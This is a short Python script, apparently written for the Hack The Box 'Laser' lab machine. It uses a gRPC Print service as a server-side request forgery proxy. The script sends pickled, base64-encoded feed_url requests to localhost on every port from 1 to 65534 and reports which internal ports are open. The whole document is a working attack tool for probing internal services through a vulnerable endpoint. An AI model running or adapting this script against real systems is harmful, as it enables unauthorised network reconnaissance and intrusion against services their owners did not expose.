import grpc
import base64,pickle
import laser_pb2
import laser_pb2_grpc
import sys

for port in range(1,65535):

	print("\rChecking port {} >".format(port)),
	sys.stdout.flush()
	channel = grpc.insecure_channel('10.10.10.201:9000')
	stub = laser_pb2_grpc.PrintStub(channel)
	data = '{"feed_url": "http://localhost:' + str(port) + '"}'
	data = base64.b64encode(pickle.dumps(data))

	content = laser_pb2.Content(data=data)
	try:
		response = stub.Feed(content)
		print("open, {}".format(response))
	except Exception as ex:
		if 'Connection refused' in ex.details():
			continue
		print ("open")
